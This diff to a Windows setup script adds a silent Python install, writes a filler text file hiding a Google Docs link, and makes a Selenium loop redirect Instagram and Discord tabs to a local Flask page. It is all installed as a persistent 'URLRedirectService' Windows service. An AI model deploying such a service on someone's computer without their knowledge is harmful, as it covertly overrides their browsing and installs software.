@@ -2,12 +2,27 @@ import os
 import subprocess
 import sys
 
+def install_python():
+    # Download and install Python from python.org
+    python_installer = 'python-3.11.2-amd64.exe'
+    python_url = f'https://www.python.org/ftp/python/3.11.2/{python_installer}'
+    subprocess.check_call(['powershell', '-Command', f"Invoke-WebRequest -Uri {python_url} -OutFile {python_installer}"])
+    subprocess.check_call([python_installer, '/quiet', 'InstallAllUsers=1', 'PrependPath=1'])
+    os.remove(python_installer)
+
 def install_packages():
     packages = ['selenium', 'flask', 'pywin32', 'webdriver-manager']
     for package in packages:
         subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])
 
 def setup_files():
+    if not os.path.exists('HaveFunScrolling.txt'):
+        with open('HaveFunScrolling.txt', 'w') as f:
+            lines = ["Have fun scrolling!\n"] * 499
+            lines.append("https://docs.google.com/document/d/1zN4IyoDTEbQ4R0eBg6FVevuUsrTSxMnooUovIV6skqQ/edit\n")
+            lines.extend(["Have fun scrolling!\n"] * 500)
+            f.writelines(lines)
+
     if not os.path.exists('server.py'):
         with open('server.py', 'w') as f:
             f.write("""\
@@ -27,10 +42,14 @@ if __name__ == '__main__':
         with open('monitor_redirect.py', 'w') as f:
             f.write("""\
 import time
+import logging
 from selenium import webdriver
 from selenium.webdriver.chrome.service import Service as ChromeService
 from selenium.webdriver.chrome.options import Options
 from webdriver_manager.chrome import ChromeDriverManager
+
+# Configure logging
+logging.basicConfig(level=logging.INFO)
 
 # URLs to redirect
 urls_to_redirect = ["https://www.instagram.com", "https://discord.com"]
@@ -44,9 +63,13 @@ driver = webdriver.Chrome(service=ChromeService(ChromeDriverManager().install())
 
 try:
     while True:
-        for url in urls_to_redirect:
-            if any(url in tab.get('url') for tab in driver.window_handles):
-                driver.execute_script(f"window.location.href = 'http://localhost:5000';")
+        for handle in driver.window_handles:
+            driver.switch_to.window(handle)
+            current_url = driver.current_url
+            for url in urls_to_redirect:
+                if url in current_url:
+                    logging.info(f"Redirecting {current_url} to http://localhost:5000")
+                    driver.get('http://localhost:5000')
         time.sleep(5)  # Check every 5 seconds
 finally:
     driver.quit()
@@ -60,7 +83,6 @@ import win32service
 import win32event
 import servicemanager
 import subprocess
-import os
 
 class MyService(win32serviceutil.ServiceFramework):
     _svc_name_ = "URLRedirectService"
@@ -97,6 +119,7 @@ def create_service():
     subprocess.check_call([sys.executable, 'myservice.py', 'start'])
 
 if __name__ == '__main__':
+    install_python()
     install_packages()
     setup_files()
     create_service()
